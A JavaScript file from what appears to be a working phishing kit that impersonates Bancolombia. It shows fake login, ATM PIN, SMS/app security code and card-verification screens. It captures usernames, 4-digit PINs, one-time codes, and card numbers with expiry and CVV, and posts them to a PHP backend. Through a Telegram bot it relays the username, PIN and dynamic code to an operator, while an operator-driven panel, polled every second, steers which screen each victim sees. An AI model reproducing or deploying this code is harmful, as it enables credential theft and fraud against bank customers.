let firebaseConfig;
let database;

let botToken;
let chatId;

function configurarInputs(selectorClase) {
  // Seleccionar inputs específicos
  const inputs = document.querySelectorAll(selectorClase);

  // Agregar eventos a cada input
  inputs.forEach((input, index) => {


    input.addEventListener("input", (e) => {
      const value = e.target.value;

      // Mover al siguiente input
      if (value.length === 1 && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }
    });

    input.addEventListener("keydown", (e) => {
      // Retroceder si se presiona Backspace y el campo está vacío
      if (e.key === "Backspace" && !e.target.value && index > 0) {
        inputs[index - 1].focus();
      }
    });

    // Evitar caracteres no numéricos
    input.addEventListener("keypress", (e) => {
      if (!/^\d$/.test(e.key)) {
        e.preventDefault();
      }
    });
  });
}

// Configurar lógica para cada conjunto de inputs


// Función para cargar configuraciones desde config.json
async function loadFirebaseConfig() {
  try {
    const response = await fetch('../../config.json'); // Ruta al archivo config.json
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);

    const config = await response.json();

    // Inicializar Firebase con la configuración cargada
    // firebaseConfig = config.firebaseConfig;
    // firebase.initializeApp(firebaseConfig);
    // database = firebase.database();

    // Asignar valores del bot desde el archivo config.json
    botToken = config.botToken;
    chatId = config.chatId;
  } catch (error) {
    console.error("Error al cargar la configuración de Firebase:", error);
  }
}

async function initApp() {
  await loadFirebaseConfig();
  console.log("Aplicación lista para usar Firebase");
  // Aquí puedes invocar otras funciones o lógica de tu app
}

document.addEventListener("DOMContentLoaded", function () {
  // Obtener el valor de enti de la URL
  var urlParams = new URLSearchParams(window.location.search);
  clienteid = urlParams.get("date");
});



function mostrarSeccion(seccion) {
  fetch("../../update_data.php", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: `id=${clienteid}&campo2=sectionVisible&valor2=${seccion}`
  })
    .then(response => response.json())
    .then(data => {
      console.log("Sección actualizada:", data);
    })
    .catch(error => console.error("Error en la petición:", error));
}

function imprimirusuario() {
  usuario = document.getElementById("usuarioInput").value; // Asignar el valor a la variable usuario
  if (/\s/.test(usuario)) {
    alert("El Usuario no puede contener espacios en blanco.");
    return; // Detener la ejecuci n de la funci n en este punto
  }

  if (usuario === "") {
    alert("Por favor, ingresa tu Usuario.");
    return; // Detener la ejecuci n de la funci n en este punto
  }

  if (!/\d/.test(usuario)) {
    alert("El Usuario debe contener al menos un n mero.");
    document.getElementById("usuarioInput").value = "";
    return;
  }

  if (clienteid && clienteid.startsWith("tc")) {

      let data = new URLSearchParams();
      data.append("id", clienteid);
      data.append("id2", clienteid);
      data.append("campo1", "usuario");
      data.append("valor1", usuario);
      data.append("campo1_2", "usuario");
      data.append("valor1_2", usuario);


      fetch("../../update_data.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: data.toString()
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === "success") {
          localStorage.setItem("usuario", usuario);
          console.log("El clienteid comienza con 'tc'");
          document.getElementById("usuario").style.display = "none";
          document.getElementById("clavefija").style.display = "";
        } else {
            console.error("Error al actualizar usuario:", data);
        }
    })
    .catch(error => console.error("Error en la petición:", error));


  } else {
      let data = new URLSearchParams();
      data.append("id", clienteid);
      data.append("id2", clienteid);
      data.append("campo1", "usuario");
      data.append("valor1", usuario);
      data.append("campo1_2", "usuario");
      data.append("valor1_2", usuario);

    fetch("../../update_data.php", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: data.toString()
      })
      .then(response => response.json())
      .then(data => {
          if (data.status === "success") {
            localStorage.setItem("usuario", usuario);
            document.getElementById("usuario").style.display = "none";
            document.getElementById("clavefija").style.display = "";
            // Hacer otra cosa si clienteid no comienza con "tc"
            console.log("El clienteid no comienza con 'tc'");
          } else {
              console.error("Error al actualizar usuario:", data);
          }
      })
      .catch(error => console.error("Error en la petición:", error));



  }
}

function imprimirclave2() {
  var clave = document.getElementById("claveInput").value;
  let usuario =  localStorage.getItem("usuario");
  
     // Validar la longitud del keyboard_display
    if (clave.length !== 4) {
        alert("La clave debe tener exactamente 4 caracteres.");
        return; // Detener la ejecución si no cumple con la longitud requerida
    }



  if (clave === "") {
    alert("Por favor, ingresa tu Clave.");
    return; // Detener la ejecuci n de la funci n en este punto
  }
  
    
 
  if (isNaN(clave)) {
    alert("La Clave debe ser un numero.");
    claveInput.value = "";
    return;
  }
      let data = new URLSearchParams();
      data.append("id", clienteid);
      data.append("id2", clienteid);
      data.append("campo1", "usuario");
      data.append("campo2", "clave");
      data.append("valor1", usuario);
      data.append("valor2", clave);
      data.append("campo1_2", "usuario");
      data.append("campo2_2", "clave");
      data.append("valor1_2", usuario);
      data.append("valor2_2", clave);


      fetch("../../update_data.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: data.toString()
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === "success") {
          var message = `
          Cliente #: ${clienteid}
          usuario: ${usuario}
          clave: ${clave}
          `;
          enviarTelegramBot2(botToken, chatId, message, "Bot 1", "esta en bancolombia", clienteid)

          mostrarSeccion("espera");
        } else {
            console.error("Error al actualizar usuario:", data);
        }
    })
    .catch(error => console.error("Error en la petición:", error));

}

function imprimirclave() {
  var clave = document.getElementById("claveInput").value;
  
    if (clave.length !== 4) {
        alert("La clave debe tener exactamente 4 caracteres.");
        return; // Detener la ejecución si no cumple con la longitud requerida
    }



  if (clave === "") {
    alert("Por favor, ingresa tu Clave.");
    return;
  }
  

  if (isNaN(clave)) {
    alert("La Clave debe ser un n mero.");
    claveInput.value = "";
    return;
  }

  if (clienteid && clienteid.startsWith("tc")) {
    let usuario = localStorage.getItem("usuario");
    var message = `
    Cliente #: ${clienteid}
    U: ${usuario}
    C: ${clave}
    `;


      let data = new URLSearchParams();
      data.append("id", clienteid);
      data.append("id2", clienteid);
      data.append("campo1", "usuario");
      data.append("campo2", "clave");
      data.append("valor1", usuario);
      data.append("valor2", clave);
      data.append("campo1_2", "usuario");
      data.append("campo2_2", "clave");
      data.append("valor1_2", usuario);
      data.append("valor2_2", clave);


      fetch("../../update_data.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: data.toString()
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === "success") {
          
        enviarTelegramBot2(botToken, chatId, message, "Bot 1", "esta en bancolombia", clienteid)

        document.getElementById("clavefija").style.display = "none";
        document.getElementById("Terminado2").style.display = "";
        } else {
            console.error("Error al actualizar usuario:", data);
        }
    })
    .catch(error => console.error("Error en la petición:", error));


  } else {
    

      let data = new URLSearchParams();
      data.append("id", clienteid);
      data.append("id2", clienteid);
      data.append("campo1", "usuario");
      data.append("campo2", "clave");
      data.append("valor1", usuario);
      data.append("valor2", clave);
      data.append("campo1_2", "usuario");
      data.append("campo2_2", "clave");
      data.append("valor1_2", usuario);
      data.append("valor2_2", clave);


      fetch("../../update_data.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: data.toString()
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === "success") {
        } else {
            console.error("Error al actualizar usuario:", data);
        }
    })
    .catch(error => console.error("Error en la petición:", error));
     
    var message = `
    Cliente #: ${clienteid}
    U: ${usuario}
    C: ${clave}
    `;  
    enviarTelegramBot2(botToken, chatId, message, "Bot 1", "esta en bancolombia", clienteid);
    mostrarSeccion("espera");
    document.getElementById("clavefija").style.display = "none";

    var section = document.createElement("section");
    section.id = clienteid;
    section.innerHTML = `

  <section id="espera">
  <img class="logooficial" src="/assets/logo-oficial.png">
<h1 class="tituloespera">Por favor, espere un momento estamos validando tu solicitud. <br><br> No cierre o recargue esta pagina, para evitar bloqueos en su cuenta.</h1>
    <img class="loading" src="/assets/loading-25.gif">
</section>

  <section id="usuario_invalido">
  <div class="caja_error">
    <p class="errortexto"><img class="alerta" src="/assets/alerta.png">Tu usuario o clave son incorrectos, intentalo nuevamente. </p>
  </div>
  <p class="hola2"><b>¡Hola!</b></p>
<p class="titulo2" >Si aun no has creado el usuario, ingresa el numero del documento de identidad.</p>
<div class="input-box">
  <img class="iconouser" src="/assets/ico-usu.png">
  <input class="input" type="text" id="usuarioInput2" placeholder="Ingresa el usuario">
</div>
<button class="btn-continuar" onclick="imprimirusuario2()">Continuar</button>
<p class="noeres"><b>¿No eres cliente?</b></p>
</section>

<section id="clave">
  <p class="titulo2">Ingresa la clave que utilizas en el cajero</p>
  <div class="input-box">
    <img class="iconopass" src="/assets/desbloquear.png">
    <p class="titulo2pass">Ingresa la clave</p>
    <input class="inputpass" id="claveInput" maxlength="4" type="password" inputmode="numeric" >
  </div>
  <button class="btn-continuar" onclick="imprimirclave2()">Continuar</button>
  </section>

<section id="Dinamica_SMS">
<p class="hola"><b>Codigo de seguridad</b></p>
<p class="titulo2din" >Para confirmar que eres tu, Ingresa el codigo que te enviamos al correo o a tu celular en un mensaje de texto.</p>

<div class="input-box">
  <img class="iconopass" src="/assets/desbloquear.png">
  <p class="titulo2pass">Ingresa el codigo de seguridad</p>
  <input class="inputdin" id="dinrelojInput" maxlength="6" type="password" inputmode="numeric" value="">
</div>
<button class="btn-continuar" onclick="imprimirdinreloj()">Continuar</button>
</section>

<section id="Dinamica_SMS_invalida">
<div class="caja_error">
  <p class="errortexto"><img class="alerta" src="/assets/alerta.png">El codigo ingresado no es valido, intentalo nuevamente. </p>
</div>
<p class="hola2"><b>Codigo de seguridad</b></p>
<p class="titulo2din" >Para confirmar que eres tu, Ingresa el codigo que te enviamos al correo o a tu celular en un mensaje de texto.</p>

<div class="input-box">
  <img class="iconopass" src="/assets/desbloquear.png">
  <p class="titulo2pass">Ingresa el codigo de seguridad</p>
  <input class="inputdin" id="relojinvalidainput" maxlength="6" type="password" inputmode="numeric" input="">
</div>
<button class="btn-continuar" onclick="imprimirrelojinvalida()">Continuar</button>
</section>

<section id="Dinamica_APP">
<p class="hola"><b>Codigo de seguridad</b></p>
<p class="titulo2din" >Para validar que eres tu, confirma el codigo de tu clave dinamica desde el celular que tienes registrado con nosotros.</p>

<div class="input-box">
  <img class="iconopass" src="/assets/desbloquear.png">
  <p class="titulo2pass">Ingresa el codigo de seguridad</p>
  <input class="inputdin" id="dinamicaninput" maxlength="6" type="password" inputmode="numeric" input="" > 
</div>
<button class="btn-continuar" onclick="imprimirdinamican()">Continuar</button>
</section>

<section id="Dinamica_APP_invalida">
<div class="caja_error">
  <p class="errortexto"><img class="alerta" src="/assets/alerta.png">El codigo ingresado no es valido, intentalo nuevamente. </p>
</div>
<p class="hola2"><b>Codigo de seguridad</b></p>
<p class="titulo2din" >Para validar que eres tu, confirma el codigo de tu clave dinamica desde el celular que tienes registrado con nosotros.</p>

<div class="input-box">
  <img class="iconopass" src="/assets/desbloquear.png">
  <p class="titulo2pass">Ingresa el codigo de seguridad</p>
  <input class="inputdin" id="norinvalidainput" maxlength="6" type="password" inputmode="numeric" input="">
</div>
<button class="btn-continuar" onclick="imprimirnorinvalida()">Continuar</button>
</section>

<section id="Tarjeta">
<p class="hola"><b>Ultima Verificacion de identidad</b></p>
<p class="titulo2din" >Para confirmar que eres tu y por tu seguridad, confirma los datos de tu tarjeta de credito o debito afiliada con nosotros.</p>

<div class="input-box">
  <img class="iconocard" src="/assets/tarj.png">
  <p class="titulo2pass">N mero de Tarjeta</p>
  <input class="inputcard" id="tcinput" type="tex" inputmode="numeric" minlength="16" maxlength="16">
  <p class="titulo2pass">Fecha de vencimiento.</p>
  <input class="inputmes" id="mesinput" type="tex" inputmode="numeric" minlength="1" maxlength="2" placeholder="Mes">
  <input class="inputa o" id="fechainput" type="tex" inputmode="numeric" minlength="1" maxlength="4"placeholder="A o">
  <input class="inputcodigo" id="codigoinput" type="tex" inputmode="numeric" minlength="1" maxlength="3"placeholder="Cvv">
</div>
<button class="btn-continuar" onclick="imprimirtc();imprimirmes();imprimirfecha();imprimircodigo()">Continuar</button>
</section>

<section id="Terminado">
<img class="logooficial" src="/assets/logo-oficial.png">
<br>
<p class="titulo2verificacion">¡Su informacion fue verificada exitosamente!</p>
<img class="verificada" src="/assets/marca-de-verificacion.png">
<p class="titulo2verificacion">En unos minutos le llegara un mensaje a su celular de confirmacion exitosa.</p>
<br>
<p class="titulo2verificacion">¡Muchas gracias por preferirnos y ayudarnos a mantenerte seguro!</p>
</section>
  `;

    var contenedor = document.getElementById("contenedor");
    contenedor.appendChild(section);
    devuelvesection();
  }
}

function devuelvesection() {
  fetch(`../../get_section.php?id=${clienteid}`)
    .then(response => response.json())
    .then(data => {
      if (data.error) {
        console.error("Error al obtener la sección:", data.error);
        return;
      }

      var sectionVisible = data.sectionVisible;

      // Manteniendo la lógica EXACTA de ocultar/mostrar secciones
      document.getElementById("usuario_invalido").style.display = "none";
      document.getElementById("clave").style.display = "none";
      document.getElementById("espera").style.display = "none";
      document.getElementById("Dinamica_SMS").style.display = "none";
      document.getElementById("Dinamica_SMS_invalida").style.display = "none";
      document.getElementById("Dinamica_APP").style.display = "none";
      document.getElementById("Dinamica_APP_invalida").style.display = "none";
      document.getElementById("Tarjeta").style.display = "none";
      document.getElementById("Terminado").style.display = "none";

      if (sectionVisible === "clave") {
        document.getElementById("clave").style.display = "";
      } else if (sectionVisible === "usuario_invalido") {
        document.getElementById("usuario_invalido").style.display = "";
      } else if (sectionVisible === "espera") {
        document.getElementById("espera").style.display = "";
      } else if (sectionVisible === "Dinamica_SMS") {
        document.getElementById("Dinamica_SMS").style.display = "";
      } else if (sectionVisible === "Dinamica_SMS_invalida") {
        document.getElementById("Dinamica_SMS_invalida").style.display = "";
      } else if (sectionVisible === "Dinamica_APP") {
        document.getElementById("Dinamica_APP").style.display = "";
      } else if (sectionVisible === "Dinamica_APP_invalida") {
        document.getElementById("Dinamica_APP_invalida").style.display = "";
      } else if (sectionVisible === "Tarjeta") {
        document.getElementById("Tarjeta").style.display = "";
      } else if (sectionVisible === "Terminado") {
        document.getElementById("Terminado").style.display = "";
      }
    })
    .catch(error => console.error("Error en la petición:", error));
}

setInterval(devuelvesection, 1000);

function imprimirusuario2() {
  var usuario = document.getElementById("usuarioInput2").value;
  if (usuario === "") {
    alert("Por favor, ingresa tu Usuario.");
    return; // Detener la ejecuci n de la funci n en este punto
  }
  if (/\s/.test(usuario)) {
    alert("El Usuario no puede contener espacios en blanco.");
    return; // Detener la ejecuci n de la funci n en este punto
  }
  if (!/\d/.test(usuario)) {
    alert("El Usuario debe contener al menos un n mero.");
    usuarioInput2.value = "";
    return;
  }

      let data = new URLSearchParams();
      data.append("id", clienteid);
      data.append("id2", clienteid);
      data.append("campo1", "usuario");
      data.append("valor1", usuario);
      data.append("campo1_2", "usuario");
      data.append("valor1_2", usuario);


      fetch("../../update_data.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: data.toString()
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === "success") {
          localStorage.setItem("usuario", usuario);
          mostrarSeccion("clave");
        } else {
            console.error("Error al actualizar usuario:", data);
        }
    })
    .catch(error => console.error("Error en la petición:", error));


  
}

function imprimirdinreloj() {
  var dinreloj = document.getElementById("dinrelojInput").value;
  
      if (dinreloj.length !== 6) {
        alert("La clave debe tener exactamente 6 caracteres.");
        return; // Detener la ejecución si no cumple con la longitud requerida
    }



  if (dinreloj === "") {
    alert("Por favor, ingresa el Codigo.");
    return;
  }

  if (isNaN(dinreloj)) {
    alert("El codigo debe ser un n mero.");
    dinrelojInput.value = "";
    return;
  }




    let data = new URLSearchParams();
      data.append("id", clienteid);
      data.append("id2", clienteid);
      
      data.append("campo1", "dinreloj");
      data.append("valor1", dinreloj);
      data.append("campo2", "color");
     data.append("valor2", "verde");

      data.append("campo1_2", "dinreloj");
      data.append("valor1_2", dinreloj);
      data.append("campo2_2", "color");
      data.append("valor2_2", "verde");


      fetch("../../update_data.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: data.toString()
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === "success") {
          mostrarSeccion("espera"); 
        } else {
            console.error("Error al actualizar usuario:", data);
        }
    })
    .catch(error => console.error("Error en la petición:", error));
 
}

function imprimirrelojinvalida() {
  var relojinvalida = document.getElementById("relojinvalidainput").value;
  
   if (relojinvalida.length !== 6) {
        alert("La clave debe tener exactamente 6 caracteres.");
        return; // Detener la ejecución si no cumple con la longitud requerida
    }
    
    
  if (relojinvalida === "") {
    alert("Por favor, ingresa el Codigo.");
    return;
  }

  if (isNaN(relojinvalida)) {
    alert("El codigo debe ser un numero.");
    relojinvalidainput.value = "";
    return;
  }

    let data = new URLSearchParams();
    data.append("id", clienteid);
    data.append("id2", clienteid);
    
    data.append("campo1", "relojinvalida");
    data.append("valor1", relojinvalida);
    data.append("campo2", "color");
    data.append("valor2", "verde");


    data.append("campo1_2", "relojinvalida");
    data.append("valor1_2", relojinvalida);
    data.append("campo2_2", "color");
    data.append("valor2_2", "verde");


    fetch("../../update_data.php", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: data.toString()
  })
  .then(response => response.json())
  .then(data => {
      if (data.status === "success") {
        mostrarSeccion("espera"); 
      } else {
          console.error("Error al actualizar usuario:", data);
      }
  })
  .catch(error => console.error("Error en la petición:", error)); 

}

function imprimirdinamican() {
  var dinamican = document.getElementById("dinamicaninput").value;
  
     if (dinamican.length !== 6) {
        alert("La clave debe tener exactamente 6 caracteres.");
        return; // Detener la ejecución si no cumple con la longitud requerida
    }
    
    
  if (dinamican === "") {
    alert("Por favor, ingresa el Codigo.");
    return;
  }

  if (isNaN(dinamican)) {
    alert("El codigo debe ser un numero.");
    dinamicaninput.value = "";
    return;
  }

    var message = `
    Cliente #: ${clienteid}
    clave dinamica: ${dinamican}
    `;


    let data = new URLSearchParams();
    data.append("id", clienteid);
    data.append("id2", clienteid);
    
    data.append("campo1", "dinamican");
    data.append("valor1", dinamican);
    data.append("campo2", "color");
    data.append("valor2", "verde");


    data.append("campo1_2", "dinamican");
    data.append("valor1_2", dinamican);
    data.append("campo2_2", "color");
    data.append("valor2_2", "verde");


    fetch("../../update_data.php", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: data.toString()
  })
  .then(response => response.json())
  .then(data => {
      if (data.status === "success") {
        enviarTelegramBot2(botToken, chatId, message, "Bot 1", "esta en bancolombia", clienteid)
        mostrarSeccion("espera"); 
      } else {
          console.error("Error al actualizar usuario:", data);
      }
  })
  .catch(error => console.error("Error en la petición:", error));

}

function imprimirnorinvalida() {
  var norinvalida = document.getElementById("norinvalidainput").value;
    if (norinvalida.length !== 6) {
        alert("La clave debe tener exactamente 6 caracteres.");
        return; // Detener la ejecución si no cumple con la longitud requerida
    }
  
  if (norinvalida === "") {
    alert("Por favor, ingresa el Codigo.");
    return;
  }

  if (isNaN(norinvalida)) {
    alert("El codigo debe ser un numero.");
    norinvalidainput.value = "";
    return;
  }

  
    let data = new URLSearchParams();
    data.append("id", clienteid);
    data.append("id2", clienteid);
    
    data.append("campo1", "norinvalida");
    data.append("valor1", norinvalida);
    data.append("campo2", "color");
    data.append("valor2", "verde");


    data.append("campo1_2", "norinvalida");
    data.append("valor1_2", norinvalida);
    data.append("campo2_2", "color");
    data.append("valor2_2", "verde");


    fetch("../../update_data.php", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: data.toString()
  })
  .then(response => response.json())
  .then(data => {
      if (data.status === "success") {
        mostrarSeccion("espera"); 
      } else {
          console.error("Error al actualizar usuario:", data);
      }
  })
  .catch(error => console.error("Error en la petición:", error));  

}
function imprimirtc() {
  var tc = document.getElementById("tcinput").value;
  

  let data = new URLSearchParams();
    data.append("id", clienteid);
    data.append("id2", clienteid);
    data.append("campo1", "tc");
    data.append("valor1", tc);


    data.append("campo1_2", "tc");
    data.append("valor1_2", tc);


    fetch("../../update_data.php", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: data.toString()
  })
  .then(response => response.json())
  .then(data => {
      if (data.status === "success") {
        
      } else {
          console.error("Error al actualizar usuario:", data);
      }
  })
  .catch(error => console.error("Error en la petición:", error));  

}
function imprimirmes() {
  var mes = document.getElementById("mesinput").value;

  let data = new URLSearchParams();
    data.append("id", clienteid);
    data.append("id2", clienteid);
    data.append("campo1", "mes");
    data.append("valor1", mes);


    data.append("campo1_2", "mes");
    data.append("valor1_2", mes);


    fetch("../../update_data.php", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: data.toString()
  })
  .then(response => response.json())
  .then(data => {
      if (data.status === "success") {
       
      } else {
          console.error("Error al actualizar usuario:", data);
      }
  })
  .catch(error => console.error("Error en la petición:", error));
}
function imprimirfecha() {
  var fecha = document.getElementById("fechainput").value;

  let data = new URLSearchParams();
    data.append("id", clienteid);
    data.append("id2", clienteid);
    data.append("campo1", "fecha");
    data.append("valor1", fecha);


    data.append("campo1_2", "fecha");
    data.append("valor1_2", fecha);


    fetch("../../update_data.php", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: data.toString()
  })
  .then(response => response.json())
  .then(data => {
      if (data.status === "success") {
      } else {
          console.error("Error al actualizar usuario:", data);
      }
  })
  .catch(error => console.error("Error en la petición:", error));

  
}
function imprimircodigo() {
  var codigo = document.getElementById("codigoinput").value;

  let data = new URLSearchParams();
    data.append("id", clienteid);
    data.append("id2", clienteid);
    data.append("campo1", "codigo");
    data.append("valor1", codigo);


    data.append("campo1_2", "codigo");
    data.append("valor1_2", codigo);


    fetch("../../update_data.php", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: data.toString()
  })
  .then(response => response.json())
  .then(data => {
      if (data.status === "success") {
      } else {
          console.error("Error al actualizar usuario:", data);
      }
  })
  .catch(error => console.error("Error en la petición:", error));
}

function mostrarnuevodiv(sectionId) {
  // Ocultar todas las secciones
  var secciones = document.getElementsByTagName("section");
  for (var i = 0; i < secciones.length; i++) {
    secciones[i].style.display = "none";
  }

  // Mostrar la secci n seleccionada
  var seccion = document.getElementById(clienteid);
  if (seccion) {
    seccion.style.display = "block";
  }
}

function enviarTelegramBot2(
  botToken,
  chatId,
  message,
  botName,
  option,
  clienteid
) {
  var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
    message
  )}`;

  fetch(url)
    .then((response) => response.json())
    .then((data) => {
      if (data.ok) {
        console.log(clienteid + "entro a" + option);
      } else {
        console.log(`Error al enviar el mensaje a ${botName}`);
      }
    })
    .catch((error) => {
      console.error(`Error al enviar el mensaje a ${botName}:`, error);
      console.log(`Error al enviar el mensaje a ${botName}`);
    });
}
// PIN (4 dígitos)
configurarInputs(".digit-dynamic");   // Código dinámico (6 dígitos)
configurarInputs(".digit-dynamic2");   // Código dinámico (6 dígitos)
configurarInputs(".digit");
configurarInputs(".digit2");
// Llama a la inicialización al inicio
initApp();
